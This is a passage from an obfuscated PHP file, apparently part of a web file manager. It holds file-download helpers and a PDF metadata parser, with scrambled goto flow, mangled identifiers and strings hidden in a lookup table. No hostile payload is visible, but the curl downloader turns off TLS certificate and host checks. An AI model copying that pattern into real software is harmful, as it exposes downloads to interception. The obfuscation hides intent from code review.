json_encode($A¸©œ·„Ô)); $FÙò„‹®Úö = self::fileDownloadCurl($d¡Øšƒóø, $dÛˆ¿®œ°», !0, $f§Şå§æ¾Ï, $CïÌÜØ¨İ); goto fÊœÂí‘¿‘; fÊœÂí‘¿‘: if ($FÙò„‹®Úö[$CåÁÕÜ´ó«[1036]]) { @unlink($C¸Â–íéâÁ); } return $FÙò„‹®Úö; goto aĞ“•²Ë; F…÷ä™®ºä: $CåÁÕÜ´ó« =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!request_url_safe($d¡Øšƒóø)) { return array($CåÁÕÜ´ó«[1036] => !1, $CåÁÕÜ´ó«[1038] => $CåÁÕÜ´ó«[1041]); } $C¸Â–íéâÁ = $dÛˆ¿®œ°» . $CåÁÕÜ´ó«[1518]; goto FªÌñãÛïŸ; aá«¾°ïÉ¿: $CïÌÜØ¨İ = intval($Cµ‘Õ¶¡…³[$CåÁÕÜ´ó«[334]]); if (file_exists($bì“§¤ØŠÅ) && time() - filemtime($bì“§¤ØŠÅ) < 3) { return array($CåÁÕÜ´ó«[1036] => !1, $CåÁÕÜ´ó«[1038] => $CåÁÕÜ´ó«[1520]); } $A¸©œ·„Ô = array(); goto EÀ›îñà; FªÌñãÛïŸ: $bì“§¤ØŠÅ = $dÛˆ¿®œ°» . $CåÁÕÜ´ó«[1519]; if (is_array($d¡Øšƒóø)) { $Cµ‘Õ¶¡…³ = $d¡Øšƒóø; } else { $Cµ‘Õ¶¡…³ = url_header($d¡Øšƒóø); } $d¡Øšƒóø = $Cµ‘Õ¶¡…³[$CåÁÕÜ´ó«[304]]; goto fØˆùºİÆ; aĞ“•²Ë: } static function fileDownloadFopen($a¼Ÿ·¾ÇÓ, $AÒƒ÷ŒÓ‹ß, $CÇÓŠ¤™ôİ = 0) { $C‚³¾–èÄ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; @ini_set($C‚³¾–èÄ‘[1522], $C‚³¾–èÄ‘[1523]); $b…¾Ñåîƒš = $AÒƒ÷ŒÓ‹ß . $C‚³¾–èÄ‘[1519]; set_timeout(); @unlink($b…¾Ñåîƒš); if ($EåÏºê¯á = @fopen($a¼Ÿ·¾ÇÓ, $C‚³¾–èÄ‘[1524])) { goto B©—Éï©…; D¿ÀÄßŸîØ: fclose($EåÏºê¯á); self::checkGzip($b…¾Ñåîƒš); if (!@rename($b…¾Ñåîƒš, $AÒƒ÷ŒÓ‹ß)) { usleep(round(rand(0, 1000) * 50)); @unlink($AÒƒ÷ŒÓ‹ß); $E¶‡Ú”ÙÖ¶ = @rename($b…¾Ñåîƒš, $AÒƒ÷ŒÓ‹ß); if (!$E¶‡Ú”ÙÖ¶) { return array($C‚³¾–èÄ‘[1036] => !1, $C‚³¾–èÄ‘[1038] => $C‚³¾–èÄ‘[1528]); } } goto bæ±‘Óôğë; bæ±‘Óôğë: return array($C‚³¾–èÄ‘[1036] => !0, $C‚³¾–èÄ‘[1038] => $C‚³¾–èÄ‘[709]); goto fŒšÁ»’ÆÈ; B©—Éï©…: if (!($fÚ²¿³†ÅÜ = @fopen($b…¾Ñåîƒš, $C‚³¾–èÄ‘[1525]))) { return array($C‚³¾–èÄ‘[1036] => !1, $C‚³¾–èÄ‘[1038] => $C‚³¾–èÄ‘[1526]); } while (!feof($EåÏºê¯á)) { if (!file_exists($b…¾Ñåîƒš)) { fclose($fÚ²¿³†ÅÜ); return array($C‚³¾–èÄ‘[1036] => !1, $C‚³¾–èÄ‘[1038] => $C‚³¾–èÄ‘[1527]); } clearstatcache(); if ($CÇÓŠ¤™ôİ > 0 && $CÇÓŠ¤™ôİ == filesize(iconv_system($b…¾Ñåîƒš))) { break; } fwrite($fÚ²¿³†ÅÜ, fread($EåÏºê¯á, 1024 * 8), 1024 * 8); } fclose($fÚ²¿³†ÅÜ); goto D¿ÀÄßŸîØ; fŒšÁ»’ÆÈ: } else { return array($C‚³¾–èÄ‘[1036] => !1, $C‚³¾–èÄ‘[1038] => $C‚³¾–èÄ‘[1529]); } } static function fileDownloadCurl($bøÍïŞóƒÑ, $AƒÜ’öÑÚ, $D¼Ü…Ò–ƒ = false, $D«Õ§ê«æÔ = 0, $a°ê‚¿Ï»Å = 0) { goto e¯ÌÚºåÖ—; fÅÉ¯«Ã†: if ($CåÏŸàì„í < $a°ê‚¿Ï»Å && $a°ê‚¿Ï»Å != 0) { return array($eÂ›»ì©†â[1036] => !1, $eÂ›»ì©†â[1038] => $eÂ›»ì©†â[1520]); } if ($bÒ—­¿ÔÏ¨ && filesize($f­Ù¬’œšÏ) != 0) { self::checkGzip($f­Ù¬’œšÏ); if (!@rename($f­Ù¬’œšÏ, $AƒÜ’öÑÚ)) { @unlink($AƒÜ’öÑÚ); $bÒ—­¿ÔÏ¨ = @rename($f­Ù¬’œšÏ, $AƒÜ’öÑÚ); if (!$bÒ—­¿ÔÏ¨) { return array($eÂ›»ì©†â[1036] => !1, $eÂ›»ì©†â[1038] => $eÂ›»ì©†â[1532]); } } return array($eÂ›»ì©†â[1036] => !0, $eÂ›»ì©†â[1038] => $eÂ›»ì©†â[709]); } return array($eÂ›»ì©†â[1036] => !1, $eÂ›»ì©†â[1038] => $eÂ›»ì©†â[1533]); goto Aä„‹İè¨ß; a¶·Ì‹˜ìÛ: curl_close($E—øîä‘); fclose($D—ÓÃèŸù); $CåÏŸàì„í = filesize(iconv_system($f­Ù¬’œšÏ)); goto fÅÉ¯«Ã†; E†„è®œ§Á: curl_setopt($E—øîä‘, CURLOPT_NOPROGRESS, !1); curl_setopt($E—øîä‘, CURLOPT_PROGRESSFUNCTION, $eÂ›»ì©†â[1531]); curl_progress_start($E—øîä‘); goto FÁñ¯ù£Î; c…«ì ØÀ¹: curl_setopt($E—øîä‘, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($E—øîä‘, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($E—øîä‘, CURLOPT_SSL_VERIFYHOST, 0); goto E†„è®œ§Á; BùŠ‰Ìƒ“Ú: if ($D¼Ü…Ò–ƒ) { curl_setopt($E—øîä‘, CURLOPT_RANGE, $D«Õ§ê«æÔ . $eÂ›»ì©†â[729]); } curl_setopt($E—øîä‘, CURLOPT_FILE, $D—ÓÃèŸù); curl_setopt($E—øîä‘, CURLOPT_REFERER, get_url_link($bøÍïŞóƒÑ)); goto c…«ì ØÀ¹; FÁñ¯ù£Î: curl_setopt($E—øîä‘, CURLOPT_USERAGENT, $eÂ›»ì©†â[1523]); $bÒ—­¿ÔÏ¨ = curl_exec($E—øîä‘); curl_progress_end($E—øîä‘); goto a¶·Ì‹˜ìÛ; e¯ÌÚºåÖ—: $eÂ›»ì©†â =& $_SERVER[¶ªÕß‚ØÁŸ]; $f­Ù¬’œšÏ = $AƒÜ’öÑÚ . $eÂ›»ì©†â[1519]; set_timeout(); goto C‘æˆí£©²; C‘æˆí£©²: $D—ÓÃèŸù = @fopen($f­Ù¬’œšÏ, $eÂ›»ì©†â[986]); if (!$D—ÓÃèŸù) { return array($eÂ›»ì©†â[1036] => !1, $eÂ›»ì©†â[1038] => $eÂ›»ì©†â[1530]); } $E—øîä‘ = curl_init($bøÍïŞóƒÑ); goto BùŠ‰Ìƒ“Ú; Aä„‹İè¨ß: } static function checkGzip($cŠÀ¼µ¯º‡) { goto f¸„…±ê„å; f×¥¨î¸´†: ob_start(); readgzfile($cŠÀ¼µ¯º‡); $D„İ‘—Ó¿á = ob_get_clean(); goto DçÂâ¹¦´; DçÂâ¹¦´: file_put_contents($cŠÀ¼µ¯º‡, $D„İ‘—Ó¿á); goto Eé²ÇÚß†‘; f¸„…±ê„å: $f«‰¥„Çƒ = $_SERVER[¶ªÕß‚ØÁŸ][1534]; $e¯ñÙÈİ»œ = file_sub_str($cŠÀ¼µ¯º‡, 0, 2); if ($f«‰¥„Çƒ != $e¯ñÙÈİ»œ) { return; } goto f×¥¨î¸´†; Eé²ÇÚß†‘: } } class FileParsePdf { public static function parse($cÄÑ³‘½¢) { goto FÕÉ•°ªˆ; C°÷Üàğî: if ($cğ¦ÓÒê·Ÿ) { $Eàá¶­ìù[$Eœ…´Ù’‡¨[1345]] = $cğ¦ÓÒê·Ÿ[1]; } $Eàá¶­ìù[$Eœ…´Ù’‡¨[1543]] = 0; $C·ğÀ‡ƒŸì = $Eœ…´Ù’‡¨[1544]; goto EõéØŠ‚Í†; a¨Œ¤—òµË: if ($cğ¦ÓÒê·Ÿ[1] && $Eàá¶­ìù[$Eœ…´Ù’‡¨[1543]] < $cğ¦ÓÒê·Ÿ[1][0]) { $Eàá¶­ìù[$Eœ…´Ù’‡¨[1543]] = $cğ¦ÓÒê·Ÿ[1][0]; } $Eàá¶­ìù = self::parseInfoItem($Eàá¶­ìù); return $Eàá¶­ìù; goto e¡Ø¶§Éîö; c …Ğ ‰À: $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[1536]] = StreamWrapperIO::read($cÄÑ³‘½¢, 0, $Dí¢ŒÜ˜Ê); $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[1537]] = StreamWrapperIO::read($cÄÑ³‘½¢, $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[87]] - $Dí¢ŒÜ˜Ê, $Dí¢ŒÜ˜Ê); $E¤…‰È²¬¸ = self::decodeXref($Fˆ„âÁ’â¾); goto C˜Ôæ‹¼Ä; EõéØŠ‚Í†: preg_match_all($C·ğÀ‡ƒŸì, $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[1536]], $cğ¦ÓÒê·Ÿ); if ($cğ¦ÓÒê·Ÿ[1] && $Eàá¶­ìù[$Eœ…´Ù’‡¨[1543]] < $cğ¦ÓÒê·Ÿ[1][0]) { $Eàá¶­ìù[$Eœ…´Ù’‡¨[1543]] = $cğ¦ÓÒê·Ÿ[1][0]; } preg_match_all($C·ğÀ‡ƒŸì, $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[1537]], $cğ¦ÓÒê·Ÿ); goto a¨Œ¤—òµË; C˜Ôæ‹¼Ä: if ($E¤…‰È²¬¸) { $cçĞäÁµ = $E¤…‰È²¬¸[$Eœ…´Ù’‡¨[1538]][$Eœ…´Ù’‡¨[1195]]; $Eàá¶­ìù = self::getObjectValue($Fˆ„âÁ’â¾, $E¤…‰È²¬¸, $cçĞäÁµ); } $Eàá¶­ìù = is_array($Eàá¶­ìù) ? $Eàá¶­ìù : array(); $Eàá¶­ìù[$Eœ…´Ù’‡¨[1539]] = 0; goto bğ‚ØÚÖâ; bğ‚ØÚÖâ: $C·ğÀ‡ƒŸì = $Eœ…´Ù’‡¨[1540]; preg_match($C·ğÀ‡ƒŸì, $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[1536]], $cğ¦ÓÒê·Ÿ); if (!$Eàá¶­ìù[$Eœ…´Ù’‡¨[1539]] && count($cğ¦ÓÒê·Ÿ) == 5) { $Eàá¶­ìù[$Eœ…´Ù’‡¨[1539]] = $cğ¦ÓÒê·Ÿ[3]; $Eàá¶­ìù[$Eœ…´Ù’‡¨[1541]] = $cğ¦ÓÒê·Ÿ[4]; } goto bƒ½†ùÖƒö; FÕÉ•°ªˆ: $Eœ…´Ù’‡¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dí¢ŒÜ˜Ê = 32 * 1024; $Fˆ„âÁ’â¾ = array($Eœ…´Ù’‡¨[789] => fopen($cÄÑ³‘½¢, $Eœ…´Ù’‡¨[1173]), $Eœ…´Ù’‡¨[85] => $cÄÑ³‘½¢, $Eœ…´Ù’‡¨[87] => filesize($cÄÑ³‘½¢), $Eœ…´Ù’‡¨[1535] => $Dí¢ŒÜ˜Ê); goto c …Ğ ‰À; bƒ½†ùÖƒö: preg_match($C·ğÀ‡ƒŸì, $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[1537]], $cğ¦ÓÒê·Ÿ); if (!$Eàá¶­ìù[$Eœ…´Ù’‡¨[1539]] && count($cğ¦ÓÒê·Ÿ) == 5) { $Eàá¶­ìù[$Eœ…´Ù’‡¨[1539]] = $cğ¦ÓÒê·Ÿ[3]; $Eàá¶­ìù[$Eœ…´Ù’‡¨[1541]] = $cğ¦ÓÒê·Ÿ[4]; } preg_match($Eœ…´Ù’‡¨[1542], $Fˆ„âÁ’â¾[$Eœ…´Ù’‡¨[1536]], $cğ¦ÓÒê·Ÿ); goto C°÷Üàğî; e¡Ø¶§Éîö: } private static function parseInfoItem($BÊ’î½Ô±š) { $d¼óË‡óùÀ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$BÊ’î½Ô±š) { return !1; } $a²ì—Şß…ç = array($d¼óË‡óùÀ[1346] => array($d¼óË‡óùÀ[1545], $d¼óË‡óùÀ[33]), $d¼óË‡óùÀ[1546] => array($d¼óË‡óùÀ[1547], $d¼óË‡óùÀ[33]), $d¼óË‡óùÀ[197] => array($d¼óË‡óùÀ[1548], $d¼óË‡óùÀ[220]), $d¼óË‡óùÀ[117] => array($d¼óË‡óùÀ[1549], $d¼óË‡óùÀ[220]), $d¼óË‡óùÀ[1543] => array($d¼óË‡óùÀ[1543], $d¼óË‡óùÀ[285]), $d¼óË‡óùÀ[1539] => array($d¼óË‡óùÀ[1539], $d¼óË‡óùÀ[285]), $d¼óË‡óùÀ[1541] => array($d¼óË‡óùÀ[1541], $d¼óË‡óùÀ[285]), $d¼óË‡óùÀ[1550] => array($d¼óË‡óùÀ[1551], $d¼óË‡óùÀ[33]), $d¼óË‡óùÀ[1552] => array($d¼óË‡óùÀ[1553], $d¼óË‡óùÀ[33]), $d¼óË‡óùÀ[1554] => array($d¼óË‡óùÀ[1345], $d¼óË‡óùÀ[33])); $AÀÖòÅ¨ÜÕ = array(); foreach ($a²ì—Şß…ç as $F±Š»ºŒ => $e¡‰ÚÏøñ÷) { if (!isset($BÊ’î½Ô±š[$e¡‰ÚÏøñ÷[0]])) { continue; } $bíÛÄæ”œÛ = $BÊ’î½Ô±š[$e¡‰ÚÏøñ÷[0]]; if (!$bíÛÄæ”œÛ || is_array($bíÛÄæ”œÛ)) { continue; } switch ($e¡‰ÚÏøñ÷[1]) { case $d¼óË‡óùÀ[285]: $bíÛÄæ”œÛ = intval($bíÛÄæ”œÛ); break; case $d¼óË‡óùÀ[220]: if (substr($bíÛÄæ”œÛ, 0, 2) == $d¼óË‡óùÀ[1555]) { $bíÛÄæ”œÛ = substr($bíÛÄæ”œÛ, 2, 14); } if (strtotime($bíÛÄæ”œÛ)) { $bíÛÄæ”œÛ = date($d¼óË‡óùÀ[1556], strtotime($bíÛÄæ”œÛ)); } break; } $AÀÖòÅ¨ÜÕ[$F±Š»ºŒ] = $bíÛÄæ”œÛ; } return $AÀÖòÅ¨ÜÕ; } private static function decodeXref(&$bĞ¾–«¶¸Ù) { goto c»©¨ÚÍ­; AÕ¢í‚İâ: foreach ($Dˆ¾Ñâ£ñ[3] as $bÜÆÈ”ƒ => $eŠñƒêäÄà) { if ($Dˆ¾Ñâ£ñ[3][$bÜÆÈ”ƒ] == $f¢÷öù¥´[1560]) { $e »ˆ´·Û¢ = $d´“İˆ–É£ . $f¢÷öù¥´[80] . intval($Dˆ¾Ñâ£ñ[2][$bÜÆÈ”ƒ]); $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1557]][$e »ˆ´·Û¢] = intval($Dˆ¾Ñâ£ñ[1][$bÜÆÈ”ƒ]); ++$d´“İˆ–É£; } else { if ($Dˆ¾Ñâ£ñ[3][$bÜÆÈ”ƒ] == $f¢÷öù¥´[1561]) { ++$d´“İˆ–É£; } else { } } } if (preg_match_all($f¢÷öù¥´[1562], $c–ÓäÂÓã‹, $Dˆ¾Ñâ£ñ)) { $d¤ù–Ø½×³ = $bĞ¾–«¶¸Ù[$f¢÷öù¥´[87]] - $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1535]]; foreach ($Dˆ¾Ñâ£ñ[0] as $bÜÆÈ”ƒ => $b„Ü‡ˆ™â) { $f¹µÀï£§ = $Dˆ¾Ñâ£ñ[1][$bÜÆÈ”ƒ] . $f¢÷öù¥´[80] . $Dˆ¾Ñâ£ñ[2][$bÜÆÈ”ƒ]; $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1557]][$f¹µÀï£§] = strpos($c–ÓäÂÓã‹, $b„Ü‡ˆ™â) + $d¤ù–Ø½×³ + 1; } } if (preg_match_all($f¢÷öù¥´[1563], $c–ÓäÂÓã‹, $Dˆ¾Ñâ£ñ)) { $a˜¾ìŸÕ…¯ = count($Dˆ¾Ñâ£ñ[1]) == 1 ? $Dˆ¾Ñâ£ñ[1][0] : $Dˆ¾Ñâ£ñ[1][1]; } else { $a˜¾ìŸÕ…¯ = substr($c–ÓäÂÓã‹, -1024 * 5); } goto Eœ´ªÊËÄİ; F¸áìÉæè÷: if ($bĞ¾–«¶¸Ù[$f¢÷öù¥´[87]] - $a„äŒåö¿Ú > $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1535]]) { $f˜ºâ‚ÕÙ = 4 * $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1535]]; $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1535]] = $f˜ºâ‚ÕÙ; $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1536]] = StreamWrapperIO::read($bĞ¾–«¶¸Ù[$f¢÷öù¥´[85]], 0, $f˜ºâ‚ÕÙ); $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1537]] = StreamWrapperIO::read($bĞ¾–«¶¸Ù[$f¢÷öù¥´[85]], $bĞ¾–«¶¸Ù[$f¢÷öù¥´[87]] - $f˜ºâ‚ÕÙ, $f˜ºâ‚ÕÙ); $c–ÓäÂÓã‹ = $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1537]]; } $d´“İˆ–É£ = 0; preg_match_all($f¢÷öù¥´[1559], $c–ÓäÂÓã‹, $Dˆ¾Ñâ£ñ); goto AÕ¢í‚İâ; c»©¨ÚÍ­: $f¢÷öù¥´ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c–ÓäÂÓã‹ = $bĞ¾–«¶¸Ù[$f¢÷öù¥´[1537]]; $b‘ÕÈŞøáÇ = array($f¢÷öù¥´[1538] => array(), $f¢÷öù¥´[1557] => array()); goto EÎ³æî×éò; DÜ·À„ĞÔª: if (preg_match($f¢÷öù¥´[1571], $a˜¾ìŸÕ…¯, $Dˆ¾Ñâ£ñ) > 0) { } return $b‘ÕÈŞøáÇ; goto C–™åìå˜; EÎ³æî×éò: $BÒ‡ºà‰©ç = $f¢÷öù¥´[1558]; if (!preg_match_all($BÒ‡ºà‰©ç, $c–ÓäÂÓã‹, $Dˆ¾Ñâ£ñ, PREG_SET_ORDER, 0)) { return !1; } $a„äŒåö¿Ú = intval($Dˆ¾Ñâ£ñ[0][1]); goto F¸áìÉæè÷; D¸Â·Û©Ûë: if (preg_match($f¢÷öù¥´[1569], $a˜¾ìŸÕ…¯, $Dˆ¾Ñâ£ñ) > 0) { $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[1195]] = intval($Dˆ¾Ñâ£ñ[1]) . $f¢÷öù¥´[80] . intval($Dˆ¾Ñâ£ñ[2]); } if (preg_match($f¢÷öù¥´[1570], $a˜¾ìŸÕ…¯, $Dˆ¾Ñâ£ñ) > 0) { $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[375]] = array(); $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[375]][0] = $Dˆ¾Ñâ£ñ[1]; $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[375]][1] = $Dˆ¾Ñâ£ñ[2]; } if (!$b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[1195]]) { return !1; } goto DÜ·À„ĞÔª; Eœ´ªÊËÄİ: if (preg_match($f¢÷öù¥´[1564], $a˜¾ìŸÕ…¯, $Dˆ¾Ñâ£ñ) > 0) { $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[87]] = intval($Dˆ¾Ñâ£ñ[1]); } if (preg_match($f¢÷öù¥´[1565], $a˜¾ìŸÕ…¯, $Dˆ¾Ñâ£ñ) > 0) { $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[1566]] = intval($Dˆ¾Ñâ£ñ[1]) . $f¢÷öù¥´[80] . intval($Dˆ¾Ñâ£ñ[2]); } if (preg_match($f¢÷öù¥´[1567], $a˜¾ìŸÕ…¯, $Dˆ¾Ñâ£ñ) > 0) { $b‘ÕÈŞøáÇ[$f¢÷öù¥´[1538]][$f¢÷öù¥´[1568]] = intval($Dˆ¾Ñâ£ñ[1]) . $f¢÷öù¥´[80] . intval($Dˆ¾Ñâ£ñ[2]); } goto D¸Â·Û©Ûë; C–™åìå˜: } private static function getObjectValue($DÔËÜÔŠ¼Æ, $AëÇá—µ, $D¨æ­Ğ÷–) { goto eàŒ¢ •š; Bëô„¨šœ¦: if (!is_array($b£ —ñÅó[1])) { return array(); } $dÄ±†Ùí— = array(); for ($céÄĞª¤µ = 0; $céÄĞª¤µ < count($b£ —ñÅó[1]); $céÄĞª¤µ += 2) { $B¿×¯ØÚà = $b£ —ñÅó[1][$céÄĞª¤µ]; $cˆî…ïäõö = $b£ —ñÅó[1][$céÄĞª¤µ + 1]; if (count($B¿×¯ØÚà) == 3 && $B¿×¯ØÚà[0] == $C¢ŸÉ êá©[8]) { $Eğôà¥ì = !1; if ($cˆî…ïäõö[0] == $C¢ŸÉ êá©[1572]) { $cˆî…ïäõö = self::getObject($DÔËÜÔŠ¼Æ, $AëÇá—µ[$C¢ŸÉ êá©[1557]][$cˆî…ïäõö[1]]); } $Eğôà¥ì = $cˆî…ïäõö[1]; if ($Eğôà¥ì === !1) { continue; } if (is_string($Eğôà¥ì)) { $Eğôà¥ì = self::decodeStr($Eğôà¥ì); } $dÄ±†Ùí—[$B¿×¯ØÚà[1]] = $Eğôà¥ì; } } goto c—……ïÙ‘É; c—……ïÙ‘É: return $dÄ±†Ùí—; goto F³íÚ¦¦–; eàŒ¢ •š: $C¢ŸÉ êá© =& $_SERVER[¶ªÕß‚ØÁŸ]; $b£ —ñÅó = self::getObject($DÔËÜÔŠ¼Æ, $AëÇá—µ[$C¢ŸÉ êá©[1557]][$D¨æ­Ğ÷–]); if (is_string($b£ —ñÅó[1])) { return $b£ —ñÅó[1]; } goto Bëô„¨šœ¦; F³íÚ¦¦–: } private static function getObject($BÊ Æ—ì¯, $cñâ¦÷äÚ¹) { $a±…ŞÈÒµˆ = self::getObjectItem($BÊ Æ—ì¯, $cñâ¦÷äÚ¹); $a±…ŞÈÒµˆ = self::getObjectItem($BÊ Æ—ì¯, $a±…ŞÈÒµˆ[2]); return $a±…ŞÈÒµˆ; } private static function getObjectItem($Fï£Õä°Õ‰, $E˜…Ë¶àê) { goto eØù¯çŠ¿³; aÏ“„¾š…×: $BÊ…İßÏÏÎ = self::getRawObject($Då÷ĞÑ±¤Ï, $E¦Õ¥´‹³İ); if ($E˜…Ë¶àê >= $eËß°¾¯Ü) { $BÊ…İßÏÏÎ[2] = $BÊ…İßÏÏÎ[2] + $eËß°¾¯Ü; } else { if ($E˜…Ë¶àê > $c–¬•”ó¸ø && $E˜…Ë¶àê <= $eËß°¾¯Ü) { $BÊ…İßÏÏÎ[2] = $BÊ…İßÏÏÎ[2] + $E˜…Ë¶àê; } } return $BÊ…İßÏÏÎ; goto D“³Ú†Ê§Ë; c•‹°—òÏ: $E¦Õ¥´‹³İ = $E˜…Ë¶àê >= $eËß°¾¯Ü ? $E˜…Ë¶àê - $eËß°¾¯Ü : $E˜…Ë¶àê; $Då÷ĞÑ±¤Ï = $E˜…Ë¶àê >= $eËß°¾¯Ü ? $Fï£Õä°Õ‰[$A‹ ‹’®Ñø[1537]] : $Fï£Õä°Õ‰[$A‹ ‹’®Ñø[1536]]; if ($E˜…Ë¶àê > $c–¬•”ó¸ø && $E˜…Ë¶àê <= $eËß°¾¯Ü) { $E¦Õ¥´‹³İ = 0; $Då÷ĞÑ±¤Ï = StreamWrapperIO::read($Fï£Õä°Õ‰[$A‹ ‹’®Ñø[85]], $E˜…Ë¶àê, $c–¬•”ó¸ø); } goto aÏ“„¾š…×; eØù¯çŠ¿³: $A‹ ‹’®Ñø =& $_SERVER[¶ªÕß‚ØÁŸ]; $c–¬•”ó¸ø = $Fï£Õä°Õ‰[$A‹ ‹’®Ñø[1535]]; $eËß°¾¯Ü = $Fï£Õä°Õ‰[$A‹ ‹’®Ñø[87]] - $c–¬•”ó¸ø; goto c•‹°—òÏ; D“³Ú†Ê§Ë: } private static function decodeStr($CŒ²°ÃÎÛ•) { goto cšÏÖ·ŸÚ; E‚£µ³·ŸŸ: $CŒ²°ÃÎÛ• = $aÖ²Ã×Æ™Ü[33]; foreach ($f¶«¨İÔ„İ as $BÆ¼ô‘Ïˆº) { if (preg_match($aÖ²Ã×Æ™Ü[1582], $BÆ¼ô‘Ïˆº)) { $CŒ²°ÃÎÛ• .= \chr(octdec(trim($BÆ¼ô‘Ïˆº, $aÖ²Ã×Æ™Ü[103]))); } else { $CŒ²°ÃÎÛ• .= $BÆ¼ô‘Ïˆº; } } $f¶«¨İÔ„İ = preg_split($aÖ²Ã×Æ™Ü[1583], $CŒ²°ÃÎÛ•, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fíÈªÄŸÎ¼; fíÈªÄŸÎ¼: $CŒ²°ÃÎÛ• = $aÖ²Ã×Æ™Ü[33]; foreach ($f¶«¨İÔ„İ as $BÆ¼ô‘Ïˆº) { if (preg_match($aÖ²Ã×Æ™Ü[1584], $BÆ¼ô‘Ïˆº)) { $CŒ²°ÃÎÛ• .= \chr(hexdec(trim($BÆ¼ô‘Ïˆº, $aÖ²Ã×Æ™Ü[1585]))); } else { $CŒ²°ÃÎÛ• .= $BÆ¼ô‘Ïˆº; } } $f¶«¨İÔ„İ = preg_split($aÖ²Ã×Æ™Ü[1586], $CŒ²°ÃÎÛ•, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto F†ì¢•Ãˆ¦; F†ì¢•Ãˆ¦: $CŒ²°ÃÎÛ• = $aÖ²Ã×Æ™Ü[33]; foreach ($f¶«¨İÔ„İ as $BÆ¼ô‘Ïˆº) { if (preg_match($aÖ²Ã×Æ™Ü[1587], $BÆ¼ô‘Ïˆº) && !1 === stripos($BÆ¼ô‘Ïˆº, $aÖ²Ã×Æ™Ü[1588])) { $BÆ¼ô‘Ïˆº = preg_replace($aÖ²Ã×Æ™Ü[1589], $aÖ²Ã×Æ™Ü[33], $BÆ¼ô‘Ïˆº); $BÆ¼ô‘Ïˆº = trim($BÆ¼ô‘Ïˆº, $aÖ²Ã×Æ™Ü[932]); $BÆ¼ô‘Ïˆº = pack($aÖ²Ã×Æ™Ü[1590], $BÆ¼ô‘Ïˆº); $CŒ²°ÃÎÛ• .= $BÆ¼ô‘Ïˆº; } else { $CŒ²°ÃÎÛ• .= $BÆ¼ô‘Ïˆº; } } if (preg_match($aÖ²Ã×Æ™Ü[1591], $CŒ²°ÃÎÛ•)) { $E­ÙÅ‹ä º = substr($CŒ²°ÃÎÛ•, 2); $CŒ²°ÃÎÛ• = $aÖ²Ã×Æ™Ü[33]; $C©ÀùÅ¯’— = strlen($E­ÙÅ‹ä º); for ($Fˆ½°öÈ²Ò = 0; $Fˆ½°öÈ²Ò < $C©ÀùÅ¯’—; $Fˆ½°öÈ²Ò += 2) { $bèÙ¡¥ÒÚ = hexdec(bin2hex(substr($E­ÙÅ‹ä º, $Fˆ½°öÈ²Ò, 2))); $CŒ²°ÃÎÛ• .= mb_convert_encoding($aÖ²Ã×Æ™Ü[1592] . intval($bèÙ¡¥ÒÚ) . $aÖ²Ã×Æ™Ü[77], $aÖ²Ã×Æ™Ü[1593], $aÖ²Ã×Æ™Ü[1594]); } } goto cø‘ÈÁ—È ; cšÏÖ·ŸÚ: $aÖ²Ã×Æ™Ü =& $_SERVER[¶ªÕß‚ØÁŸ]; $CŒ²°ÃÎÛ• = str_replace(array($aÖ²Ã×Æ™Ü[1573], $aÖ²Ã×Æ™Ü[1574], $aÖ²Ã×Æ™Ü[1575], $aÖ²Ã×Æ™Ü[1576], $aÖ²Ã×Æ™Ü[1577], $aÖ²Ã×Æ™Ü[1578], $aÖ²Ã×Æ™Ü[1579], $aÖ²Ã×Æ™Ü[1580]), array($aÖ²Ã×Æ™Ü[103], $aÖ²Ã×Æ™Ü[50], $aÖ²Ã×Æ™Ü[8], $aÖ²Ã×Æ™Ü[257], $aÖ²Ã×Æ™Ü[823], $aÖ²Ã×Æ™Ü[62], $aÖ²Ã×Æ™Ü[996], $aÖ²Ã×Æ™Ü[339]), $CŒ²°ÃÎÛ•); $f¶«¨İÔ„İ = preg_split($aÖ²Ã×Æ™Ü[1581], $CŒ²°ÃÎÛ•, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E‚£µ³·ŸŸ; cø‘ÈÁ—È : return $CŒ²°ÃÎÛ•; goto a¤µ¼ëì½°; a¤µ¼ëì½°: } private static function getRawObject($dÖà½‰¼ğ¾, $cÙ×•”É = 0) { goto e•ööÇ¿ø«; bœ´˜Ñ……Ş: $cÙ×•”É += strspn($dÖà½‰¼ğ¾, $f›™õ™³Ì´[1595], $cÙ×•”É); $C ”›ñÍ§« = $dÖà½‰¼ğ¾[$cÙ×•”É]; switch ($C ”›ñÍ§«) { case $f›™õ™³Ì´[1596]: $e‡à³‹ƒ—¥ = 